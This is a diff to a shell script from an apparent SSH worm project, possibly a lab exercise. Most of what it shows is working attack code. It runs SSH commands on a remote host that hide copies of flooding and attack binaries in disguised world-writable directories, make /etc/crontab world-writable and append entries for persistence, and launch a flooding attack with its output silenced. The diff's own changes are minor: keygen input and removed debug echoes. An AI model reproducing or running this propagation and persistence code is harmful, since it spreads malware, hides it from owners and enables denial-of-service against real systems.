@@ -15,11 +15,11 @@ then
 	(
 	echo "\r"
 	sleep 1
-	echo "y\r"
-	sleep 1
 	echo "\r"
 	sleep 1
 	echo "\r"
+	sleep 1
+	echo "yes\r"
 	)|ssh-keygen
 else 
 	(
@@ -35,11 +35,8 @@ fi
 #####
 
 ssh victim@"$IP_Address" 'Hidden1="/home/victim/.etc/.gitignore"; mkdir -p $Hidden1; chmod 777 $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden1 > /dev/null 2>&1'
-echo "qq1"
 ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; mkdir -p $Hidden2; chmod 777 $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden2 > /dev/null 2>&1'
-echo "qq2"
 ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; chmod 777 /etc/crontab; echo "$(cat /home/victim/Desktop/ssh_worm/crontab.txt)" >> /etc/crontab; cd "$Hidden2" && ./Flooding_Attack > /dev/null 2>&1'
-echo "qq3"
 
 
 
